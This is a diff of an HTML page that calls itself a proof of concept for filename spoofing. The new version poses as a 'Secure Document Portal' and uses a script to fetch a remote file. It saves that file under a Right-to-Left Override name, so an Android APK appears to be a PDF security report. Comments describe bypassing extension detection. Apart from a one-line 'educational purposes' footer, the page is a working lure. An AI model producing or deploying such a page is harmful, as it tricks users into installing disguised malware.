@@ -2,49 +2,74 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Filename Spoofing PoC</title>
+    <title>Secure Document Portal</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
-        .container { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        h2 { color: #333; }
-        .download-btn {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 15px 30px;
-            background-color: #e74c3c;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            font-weight: bold;
-            transition: background 0.3s;
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f7f6; }
+        .download-box { 
+            border: 1px solid #ddd; 
+            padding: 40px; 
+            background: #fff; 
+            border-radius: 10px; 
+            display: inline-block; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
-        .download-btn:hover { background-color: #c0392b; }
-        .info { margin-top: 20px; color: #666; font-size: 0.9em; }
+        .btn { 
+            display: inline-block;
+            padding: 15px 35px; 
+            background-color: #d93025; 
+            color: #fff; 
+            text-decoration: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+        .btn:hover { background-color: #b2261c; }
+        .meta { margin-top: 15px; color: #777; font-size: 0.85em; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Document Verification Required</h2>
-        <p>Please download the security report below to continue.</p>
+    <div class="download-box">
+        <h3>Encrypted Security Report</h3>
+        <p>Please download and verify the security document (PDF) to proceed.</p>
+        
+        <!-- Action button that triggers the spoofing logic -->
+        <div onclick="initiateSpoof()" class="btn">
+            Download Document (PDF)
+        </div>
 
-        <!-- 
-            The 'href' points to the local file in the same folder.
-            The 'download' attribute uses RLO (&#x202E;) to flip 'fdp.kpa' into 'apk.pdf'.
-        -->
-        <a href="com.xbrowser.play_5.5.3.apk" 
-           download="Security_Report_2024&#x202E;fdp.kpa" 
-           class="download-btn">
-           Download Security_Report.pdf
-        </a>
-
-        <div class="info">
-            File Type: PDF Document | Size: 1.2 MB
+        <div class="meta">
+            File: Security_Report_2024.pdf | Size: 1.2 MB
         </div>
     </div>
 
-    <p style="margin-top: 50px; color: #999; font-size: 0.8em;">
-        <b>Note:</b> This is a Proof of Concept (PoC) for Filename Spoofing via RLO character.
+    <script>
+        function initiateSpoof() {
+            // Using your renamed file Raw URL to bypass extension detection
+            const rawUrl = 'https://github.com';
+            
+            // RLO Character (\u202E) flips "fdp.kpa" to "apk.pdf"
+            const spoofedName = "Security_Report_2024\u202Efdp.kpa";
+
+            fetch(rawUrl)
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = spoofedName; // Injecting spoofed name
+                    document.body.appendChild(a);
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                    a.remove();
+                })
+                .catch(() => alert('Could not connect to secure server.'));
+        }
+    </script>
+
+    <p style="margin-top: 40px; color: #999; font-size: 0.8em;">
+        PoC for Educational Purposes: Demonstrating Right-to-Left Override (RLO) Vulnerability.
     </p>
 
 </body>
